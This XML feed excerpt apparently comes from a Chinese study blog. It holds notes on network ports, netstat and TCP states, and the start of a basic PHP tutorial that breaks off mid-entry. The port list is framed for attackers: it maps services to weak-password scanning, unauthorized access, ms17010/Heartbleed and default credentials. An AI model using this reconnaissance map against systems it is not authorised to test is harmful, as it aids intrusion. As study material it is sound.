        <content type="html"><![CDATA[<h1 id="1-端口的作用"><a href="#1-端口的作用" class="headerlink" title="1 端口的作用"></a>1 端口的作用</h1><p>一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。</p><h1 id="2-端口的类型"><a href="#2-端口的类型" class="headerlink" title="2 端口的类型"></a>2 端口的类型</h1><p>TCP端口和UDP端口。由于TCP和UDP两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。</p><ol><li>TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供<strong>可靠的数据传输</strong>。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</li><li>UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口，QQ使用的8000和400端口。</li></ol><h1 id="3-端口范围"><a href="#3-端口范围" class="headerlink" title="3 端口范围"></a>3 端口范围</h1><p>端口范围 0-65535</p><p>服务端使用的端口号：</p><ul><li>预留端口号，取值范围0-1023,这些端口我们编程的时候不能使用，是那些VIP应用程序使用的，只有超级用户特权的应用才允许被分配一个预留端口号。</li><li>登记端口号，取值范围1024-49151，就是我们平时编写服务器使用的端口号范围。</li></ul><p>客户端使用的端口号：</p><ul><li>取值范围49152-65535，这部分是客户端进程运行时动态选择的范围，又叫临时端口号。</li></ul><h1 id="4-查看端口"><a href="#4-查看端口" class="headerlink" title="4 查看端口"></a>4 查看端口</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat –ano</span><br></pre></td></tr></table></figure><p>可以看到外部地址kali的端口是用一个临时的端口来访问的。</p><p><img src="/img/20220616150257.png"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-t] [interval]</span><br><span class="line"></span><br><span class="line">-a 显示所有连接和侦听端口。</span><br><span class="line">-b 显示在创建每个连接或侦听端口时涉及的可执行程序。在某些情况下，已知可执行程序承载多个独立的组件，这些情况下，显示创建连接或侦听端口时涉及的组件序列。此情况下，可执行程序的名称位于底部[]中，它调用的组件位于顶部，直至达到 TCP/IP。注意，此选项可能很耗时，并且在您没有足够权限时可能失败。</span><br><span class="line">-e 显示以太网统计。此选项可以与 -s 选项结合使用。</span><br><span class="line">-f 显示外部地址的完全限定域名(FQDN)。</span><br><span class="line">-n 以数字形式显示地址和端口号。</span><br><span class="line">-o 显示拥有的与每个连接关联的进程 ID。</span><br><span class="line">-p proto 显示 proto 指定的协议的连接；proto 可以是下列任何一个: TCP、UDP、TCPv6 或 UDPv6。如果与 -s 选项一起用来显示每个协议的统计，proto 可以是下列任何一个: IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP或 UDPv6。</span><br><span class="line">-r 显示路由表。</span><br><span class="line">-s 显示每个协议的统计。默认情况下，显示IP、IPv6、ICMP、ICMPv6、TCP、TCPv6、UDP 和 UDPv6的统计；-p 选项可用于指定默认的子网。</span><br><span class="line">-t 显示当前连接卸载状态。</span><br><span class="line">interval 重新显示选定的统计，各个显示间暂停的间隔秒数。按 CTRL+C 停止重新显示统计。如果省略，则 netstat将打印当前的配置信息一次。</span><br></pre></td></tr></table></figure><p>查看端口是否被占用：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -ano|findstr &quot;80&quot;</span><br></pre></td></tr></table></figure><p>PID就是任务管理器中的程序的PID。</p><p><img src="/img/20220616150957.png"></p><p>TCP协议规定，对于已经建立的连接，网络双方要进行四次握手才能成功断开连接，如果缺少了其中某个步骤，将会使连接处于假死状态，连接本身占用的资源不会被释放。网络服务器程序要同时管理大量连接，所以很有必要保证无用连接完全断开，否则大量僵死的连接会浪费许多服务器资源。在众多TCP状态中，最值得注意的状态有两个：CLOSE_WAIT和TIME_WAIT。</p><p>TCP连接状态：</p><ol><li>LISTENING状态，FTP服务启动后首先处于侦听（LISTENING）状态。</li><li>ESTABLISHED状态，ESTABLISHED的意思是建立连接。表示两台机器正在通信。</li><li>CLOSE_WAIT状态，对方主动关闭连接或者网络异常导致连接中断，这时我方的状态会变成CLOSE_WAIT 此时我方要调用close()来使得连接正确关闭。</li><li>TIME_WAIT状态，我方主动调用close()断开连接，收到对方确认后状态变为TIME_WAIT。TCP协议规定TIME_WAIT状态会一直持续2MSL(即两倍的分段最大生存期)，以此来确保旧的连接状态不会对新连接产生影响。处于TIME_WAIT状态的连接占用的资源不会被内核释放，所以作为服务器，在可能的情况下，尽量不要主动断开连接，以减少TIME_WAIT状态造成的资源浪费。</li></ol><h1 id="5-常见的端口"><a href="#5-常见的端口" class="headerlink" title="5 常见的端口"></a>5 常见的端口</h1><h2 id="web类"><a href="#web类" class="headerlink" title="web类"></a>web类</h2><p>web漏洞&#x2F;敏感目录，第三方通用组件漏洞 struts、thinkphp、jboss、ganglia、zabbix</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">80 web</span><br><span class="line">80-89 web</span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</span><br></pre></td></tr></table></figure><p>HTTP 协议代理服务器常用端口号：<code>80/8080/3128/8081/9098</code></p><p>Apache <code>80</code></p><p>Nginx <code>80</code></p><p>Tomcat Web 默认端口号：<code>8080</code></p><p>HTTPS 服务器，默认端口号：<code>443/tcp 443/udp</code></p><p>HTTP 服务器，默认端口号为：<code>80/tcp</code> (木马Executor开放此端口)</p><p>Webshpere应用程序，默认端口号为<code>9080</code></p><p>webshpere管理工具，默认端口号<code>9090</code></p><p>JBOSS，默认端口号为<code>8080</code>，也有<code>8089</code>和<code>9090</code></p><p>Symantec AV&#x2F;Filter for MSE默认端口号为<code>8081</code></p><p>ORACLE EMCTL，默认的端口号为<code>1158</code></p><p>Oracle XDB FTP服务,默认的端口号为<code>2100</code></p><p>ganglia 默认端口号：<code>8649</code> </p><h2 id="数据库类"><a href="#数据库类" class="headerlink" title="数据库类"></a>数据库类</h2><p>扫描弱口令。</p><p>MySQL 默认端口号：<code>3306</code></p><p>PostgreSQL 默认端口号：<code>5432</code></p><p>DB2 默认端口号：<code>50000</code></p><p>Oracle 数据库，默认的端口号为<code>1521</code></p><p>Oracle XDB (XML 数据库)，默认的端口号为<code>8080</code></p><p>MS SQL*SERVER 数据库 server, 默认的端口号为<code>1433/tcp 1433/udp</code></p><p>MS SQL*SERVER 数据库 monitor, 默认的端口号为<code>1434/tcp 1434/udp</code></p><p>Redis端口<code>6379</code></p><h2 id="特殊服务类"><a href="#特殊服务类" class="headerlink" title="特殊服务类"></a>特殊服务类</h2><p>未授权&#x2F;命令执行类&#x2F;漏洞。</p><p>SSL⼼脏滴⾎：<code>443</code> </p><p>ms08067&#x2F;ms11058&#x2F;ms17010等：<code>445</code></p><p>Rsync未授权：<code>873</code> </p><p>通过网络，跨平台实现文件共享：<code>2049</code></p><p>腾讯QQ客户端：<code>4000</code></p><p>CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> ：<code>5984</code> </p><p>redis未授权：<code>6379</code> </p><p>WebLogic默认：<code>7001/7002</code> （弱⼝令，反序列）</p><p>elasticsearch：<code>9200/9300</code> （参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞）</p><p> memcache：<code>11211</code>（未授权访问）</p><p>Mongodb：<code>27017/27018</code> （未授权访问）</p><p>SAP：<code>50000</code> （命令执⾏）</p><p>hadoop默认端⼝：<code>50070/50030</code>（默认端口未授权访问）</p><h2 id="常用端口类"><a href="#常用端口类" class="headerlink" title="常用端口类"></a>常用端口类</h2><p>DNS 域名系统：<code>53</code></p><p>FTP服务器真正传输所用的端口，用于上传、下载：<code>20</code></p><p>FTP 登录认证：<code>21</code></p><p>SSH (安全登录)、SCP (文件传输)、端口号重定向，默认的端口号：<code>22/tcp</code></p><p>SFTP 文件传输：<code>22</code></p><p>Telnet 远程登录：<code>23</code> (不安全的文本传送，在本地主机上使用此端口与远程服务器的22&#x2F;3389端口连接)</p><p>zebra路由 <code>2601/2604</code> （默认密码zebra）</p><p>远程桌面，默认端口号为<code>3389</code></p><p>SMTP  (E-mail) ：<code>25/tcp</code> (木马Antigen. Email Password Sender. HaebuCoceda. Shtrilitz Stealth. WinPC. WinSpy都开放这 个端口)</p><p>POP3 Post Office Protocol (E-mai) ，默认端口号为<code>110/tcp</code></p><p>SMB ：<code>445</code>(弱口令扫描)</p><p>TFTP (Trivial File Transfer Protocol)， 默认端口号：<code>69/udp</code></p><p>SOCKS 代理协议服务器常用端口号：<code>1080</code></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>SNMP协议：<code>161</code> </p><p>LDAP：<code>389</code> </p><p>Rexec：<code>512/513/514</code> </p><p>NFS：<code>1025/111</code> </p><p>cpanel主机管理系统登陆 （国外用较多）：<code>2082/2083</code> </p><p>DA虚拟主机管理系统登陆 （国外用较多）：<code>2222</code> </p><p>squid代理默认端口：<code>3128</code> (如果没设置口令很可能就直接漫游内网了)</p><p>kangle主机管理系统登陆：<code>3312/3311</code> </p><p>rundeck：<code>4440</code> (参考WooYun: 借用新浪某服务成功漫游新浪内网)</p><p>vnc：<code>5900</code> </p><p>varnish：<code>6082</code> (参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网)</p><p>Kloxo主机控制面板登录：<code>7778</code> </p><p>Vestacp主机管理系统 （国外用较多）：<code>8083</code> </p><p>amh&#x2F;LuManager 主机管理系统默认端口：<code>8888</code> </p><p>Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统：<code>10000</code> </p><p>mongodb统计页面：<code>28017</code> </p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习笔记</title>
      <link href="/2022/06/01/PHP%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/06/01/PHP%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h1 id="1-基本语法格式"><a href="#1-基本语法格式" class="headerlink" title="1 基本语法格式"></a>1 基本语法格式</h1><p>PHP 脚本以 <code>&lt;?php</code> 开始，以 <code>?&gt;</code> 结束</p><p>&#x2F;* *&#x2F;多行注释，跟java的注释方法相同</p><p>变量以 <code>$</code> 符号开始，后面跟着变量的名称。</p><p>变量名必须以字母或者下划线字符开始</p><p>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*static的关键字的使用</span></span><br><span class="line"><span class="comment">  当一个函数完成时，它的所有变量通常都会被删除。</span></span><br><span class="line"><span class="comment">  然而，有时候您希望某个局部变量不要被删除。</span></span><br><span class="line"><span class="comment">  要做到这一点，请在您第一次声明变量时使用 static 关键字：</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$n</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="variable">$n</span>++;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;调用了一次&quot;</span>.<span class="variable">$n</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">test</span>();<span class="title function_ invoke__">test</span>();<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure><h1 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2 数据类型"></a>2 数据类型</h1><p>php有5种数据类型：String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）。</p><p>其他：Object（对象）, NULL（空值）。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;字符串类型&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">1234</span>;<span class="comment">//整形</span></span><br><span class="line"><span class="variable">$c</span> = -<span class="number">3.1415</span>;<span class="comment">//浮点型</span></span><br><span class="line"><span class="variable">$d</span> = <span class="number">8E-3</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="literal">true</span>;<span class="comment">//boolean类型</span></span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>);<span class="comment">//数组类型</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span></span>&#123;<span class="comment">//php对象的声明</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$num</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">obj</span>();<span class="comment">//对象实例化类型</span></span><br><span class="line"><span class="variable">$g</span> = <span class="literal">NULL</span>;<span class="comment">//NULL</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$c</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$e</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$f</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$o</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$g</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>整型</strong></p><p>在PHP中提供四种整形的定义方式，十进制定义，二进制定义，八进制定义和十六进制定义。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用echo输出时。默认输出为十进制</span></span><br><span class="line"><span class="title function_ invoke__">decbin</span>() <span class="comment">// 十进制转二进制</span></span><br><span class="line"><span class="title function_ invoke__">decoct</span>() <span class="comment">// 十进制转八进制</span></span><br><span class="line"><span class="title function_ invoke__">dechex</span>() <span class="comment">// 十进制转十六进制</span></span><br><span class="line"><span class="title function_ invoke__">bindec</span>() <span class="comment">// 二进制转十进制</span></span><br><span class="line"><span class="title function_ invoke__">bin2hex</span>() <span class="comment">//二进制转十六进制   </span></span><br></pre></td></tr></table></figure><p><strong>字符串</strong>：字符串变量用于存储并处理文本。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="string">&#x27;你好&#x27;</span>;</span><br><span class="line"><span class="comment">//双引号 里面有变量 会 输出变量的值</span></span><br><span class="line"><span class="variable">$str</span> =<span class="string">&quot; <span class="subst">$name</span> ，很高兴认识你。&quot;</span>;</span><br><span class="line"><span class="comment">//单引号 如果里面有变量都作为一个字符串处理</span></span><br><span class="line"><span class="variable">$str1</span> =<span class="string">&#x27; $name ，很高兴认识你。&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="variable">$text1</span> = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable">$text2</span> = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$text1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$text2</span>; <span class="comment">// &quot;.&quot;是并置运算符（连接）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;返回字符串的长度：&quot;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$text1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;返回子串l的第一次位置：&quot;</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$text1</span>, <span class="string">&quot;l&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>字符的操作函数</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符</span><br><span class="line">addslashes — 使用反斜线引用字符串</span><br><span class="line">bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</span><br><span class="line">chop — rtrim 的别名</span><br><span class="line">chr — 返回指定的字符</span><br><span class="line">chunk_split — 将字符串分割成小块</span><br><span class="line">convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种</span><br><span class="line">convert_uudecode — 解码一个 uuencode 编码的字符串</span><br><span class="line">convert_uuencode — 使用 uuencode 编码一个字符串</span><br><span class="line">count_chars — 返回字符串所用字符的信息</span><br><span class="line">crc32 — 计算一个字符串的 crc32 多项式</span><br><span class="line">crypt — 单向字符串散列</span><br><span class="line"><span class="keyword">echo</span> — 输出一个或多个字符串</span><br><span class="line">explode — 使用一个字符串分割另一个字符串</span><br><span class="line">fprintf — 将格式化后的字符串写入到流</span><br><span class="line">get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表</span><br><span class="line">hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）</span><br><span class="line">hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符</span><br><span class="line">hex2bin — 转换十六进制字符串为二进制字符串</span><br><span class="line">html_entity_decode — Convert HTML entities to their corresponding characters</span><br><span class="line">htmlentities — 将字符转换为 HTML 转义字符</span><br><span class="line">htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符</span><br><span class="line">htmlspecialchars — 将特殊字符转换为 HTML 实体</span><br><span class="line">implode — 将一个一维数组的值转化为字符串</span><br><span class="line">join — 别名 implode</span><br><span class="line">lcfirst — 使一个字符串的第一个字符小写</span><br><span class="line">levenshtein — 计算两个字符串之间的编辑距离</span><br><span class="line">localeconv — Get numeric formatting information</span><br><span class="line">ltrim — 删除字符串开头的空白字符（或其他字符）</span><br><span class="line">md5_file — 计算指定文件的 MD5 散列值</span><br><span class="line">md5 — 计算字符串的 MD5 散列值</span><br><span class="line">metaphone — Calculate the metaphone key of a <span class="keyword">string</span></span><br><span class="line">money_format — 将数字格式化成货币字符串</span><br><span class="line">nl_langinfo — Query language <span class="keyword">and</span> locale information</span><br><span class="line">nl2br — 在字符串所有新行之前插入 HTML 换行标记</span><br><span class="line">number_format — 以千位分隔符方式格式化一个数字</span><br><span class="line">ord — 转换字符串第一个字节为 <span class="number">0</span>-<span class="number">255</span> 之间的值</span><br><span class="line">parse_str — 将字符串解析成多个变量</span><br><span class="line"><span class="keyword">print</span> — 输出字符串</span><br><span class="line">printf — 输出格式化字符串</span><br><span class="line">quoted_printable_decode — 将 quoted-printable 字符串转换为 <span class="number">8</span>-bit 字符串</span><br><span class="line">quoted_printable_encode — 将 <span class="number">8</span>-bit 字符串转换成 quoted-printable 字符串</span><br><span class="line">quotemeta — 转义元字符集</span><br><span class="line">rtrim — 删除字符串末端的空白字符（或者其他字符）</span><br><span class="line">setlocale — 设置地区信息</span><br><span class="line">sha1_file — 计算文件的 sha1 散列值</span><br><span class="line">sha1 — 计算字符串的 sha1 散列值</span><br><span class="line">similar_text — 计算两个字符串的相似度</span><br><span class="line">soundex — Calculate the soundex key of a <span class="keyword">string</span></span><br><span class="line">sprintf — Return a formatted <span class="keyword">string</span></span><br><span class="line">sscanf — 根据指定格式解析输入的字符</span><br><span class="line">str_contains — Determine <span class="keyword">if</span> a <span class="keyword">string</span> contains a given substring</span><br><span class="line">str_ends_with — Checks <span class="keyword">if</span> a <span class="keyword">string</span> ends with a given substring</span><br><span class="line">str_getcsv — 解析 CSV 字符串为一个数组</span><br><span class="line">str_ireplace — str_replace 的忽略大小写版本</span><br><span class="line">str_pad — 使用另一个字符串填充字符串为指定长度</span><br><span class="line">str_repeat — 重复一个字符串</span><br><span class="line">str_replace — 子字符串替换</span><br><span class="line">str_rot13 — 对字符串执行 ROT13 转换</span><br><span class="line">str_shuffle — 随机打乱一个字符串</span><br><span class="line">str_split — 将字符串转换为数组</span><br><span class="line">str_starts_with — Checks <span class="keyword">if</span> a <span class="keyword">string</span> starts with a given substring</span><br><span class="line">str_word_count — 返回字符串中单词的使用情况</span><br><span class="line">strcasecmp — 二进制安全比较字符串（不区分大小写）</span><br><span class="line">strchr — 别名 strstr</span><br><span class="line">strcmp — 二进制安全字符串比较</span><br><span class="line">strcoll — 基于区域设置的字符串比较</span><br><span class="line">strcspn — 获取不匹配遮罩的起始子字符串的长度</span><br><span class="line">strip_tags — 从字符串中去除 HTML 和 PHP 标记</span><br><span class="line">stripcslashes — 反引用一个使用 addcslashes 转义的字符串</span><br><span class="line">stripos — 查找字符串首次出现的位置（不区分大小写）</span><br><span class="line">stripslashes — 反引用一个引用字符串</span><br><span class="line">stristr — strstr 函数的忽略大小写版本</span><br><span class="line">strlen — 获取字符串长度</span><br><span class="line">strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）</span><br><span class="line">strnatcmp — 使用自然排序算法比较字符串</span><br><span class="line">strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）</span><br><span class="line">strncmp — 二进制安全比较字符串开头的若干个字符</span><br><span class="line">strpbrk — 在字符串中查找一组字符的任何一个字符</span><br><span class="line">strpos — 查找字符串首次出现的位置</span><br><span class="line">strrchr — 查找指定字符在字符串中的最后一次出现</span><br><span class="line">strrev — 反转字符串</span><br><span class="line">strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span><br><span class="line">strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</span><br><span class="line">strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。</span><br><span class="line">strstr — 查找字符串的首次出现</span><br><span class="line">strtok — 标记分割字符串</span><br><span class="line">strtolower — 将字符串转化为小写</span><br><span class="line">strtoupper — 将字符串转化为大写</span><br><span class="line">strtr — 转换指定字符</span><br><span class="line">substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）</span><br><span class="line">substr_count — 计算字串出现的次数</span><br><span class="line">substr_replace — 替换字符串的子串</span><br><span class="line">substr — 返回字符串的子串</span><br><span class="line">trim — 去除字符串首尾处的空白字符（或者其他字符）</span><br><span class="line">ucfirst — 将字符串的首字母转换为大写</span><br><span class="line">ucwords — 将字符串中每个单词的首字母转换为大写</span><br><span class="line">vfprintf — 将格式化字符串写入流</span><br><span class="line">vprintf — 输出格式化字符串</span><br><span class="line">vsprintf — 返回格式化字符串</span><br><span class="line">wordwrap — 打断字符串为指定数量的字串</span><br></pre></td></tr></table></figure><h1 id="3-常量"><a href="#3-常量" class="headerlink" title="3 常量"></a>3 常量</h1><p><strong>常量</strong>：常量是一个简单值的标识符。该值在脚本中不能改变。（在整个脚本中都能使用）</p><p>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)</p><p>设置常量，使用 define() 函数，函数语法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">mixed</span> <span class="variable">$value</span> )</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">该函数有两个参数:</span></span><br><span class="line"><span class="comment">name：必选参数，常量名称，即标志符。</span></span><br><span class="line"><span class="comment">value：必选参数，常量的值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 常量</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;这是一个全局常量&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> AAAA;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>预定义常量</strong></p><p>PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。</p><p>（1）<code>__FILE__</code>(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。</p><p>（2）<code>__LINE__</code>(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。</p><p>（3）<code>PHP_VERSION</code>：当前PHP预处理器的版本，如5.4.16。</p><p>（4）<code>PHP_OS</code>: PHP所在的操作系统的类型。如Linux。</p><p>（5）<code>TRUE</code>：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。</p><p>（6）<code>DIRECTORY_SEPARATOR</code>: 表示目录分隔符，UNIX或Linux操作系统环境时的值为  <code>/</code> , Window操作系统环境时的值为  <code>\</code> 。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">__LINE__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_VERSION;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_OS;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> DIRECTORY_SEPARATOR;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="4-控制语句"><a href="#4-控制语句" class="headerlink" title="4 控制语句"></a>4 控制语句</h1><p>控制语法的语句结构和其他大多数语言结构相同。</p><h2 id="4-1条件语句"><a href="#4-1条件语句" class="headerlink" title="4.1条件语句"></a>4.1条件语句</h2><p><strong>if</strong> <strong>语句</strong> - 在条件成立时执行代码</p><p><strong>if…else</strong> 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码</p><p><strong>if…elseif….else</strong> 语句 - 在若干条件之一成立时执行一个代码块</p><p><strong>switch</strong> 语句 - 在若干条件之一成立时执行一个代码块</p><h2 id="4-2-循环语句"><a href="#4-2-循环语句" class="headerlink" title="4.2 循环语句"></a>4.2 循环语句</h2><p><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</p><p><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</p><p><strong>for</strong> - 循环执行代码块指定的次数</p><p><strong>foreach</strong> - 根据数组中每个元素来循环代码块</p><p><strong>break</strong> - 语句用于终止本次循环</p><p><strong>continue</strong> - 语句的作用是跳出本次循环，接着执行下一次循环</p><h1 id="5-数组"><a href="#5-数组" class="headerlink" title="5 数组"></a>5 数组</h1><p>数组是一个能在单个变量中存储多个值的特殊变量。</p><p>在 PHP 中，array() 函数用于创建数组。</p><p>在 PHP 中，有三种类型的数组：</p><p><strong>数值数组</strong> - 带有数字 ID 键的数组。</p><p><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值。</p><p><strong>多维数组</strong> - 包含一个或多个数组的数组。</p><p>数组的声明 $array1 &#x3D; array();</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);<span class="comment">//简单的数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$cars</span>),<span class="string">&quot;&lt;br/&gt;&quot;</span>;<span class="comment">//count()返回数组的长度</span></span><br><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;Peter&quot;</span>=&gt;<span class="string">&quot;35&quot;</span>,<span class="string">&quot;Ben&quot;</span>=&gt;<span class="string">&quot;37&quot;</span>,<span class="string">&quot;Joe&quot;</span>=&gt;<span class="string">&quot;43&quot;</span>);<span class="comment">//关联数组</span></span><br><span class="line"><span class="comment">//其中包含多个键值对</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Peter is &quot;</span> . <span class="variable">$age</span>[<span class="string">&#x27;Peter&#x27;</span>] . <span class="string">&quot; years old.&quot;</span>,<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$age</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$x_value</span>)<span class="comment">//关联数组的遍历方法</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . <span class="variable">$x</span> . <span class="string">&quot;, Value=&quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在PHP 中定义了多个数组排序的内置函数：</p><figure class="highlight 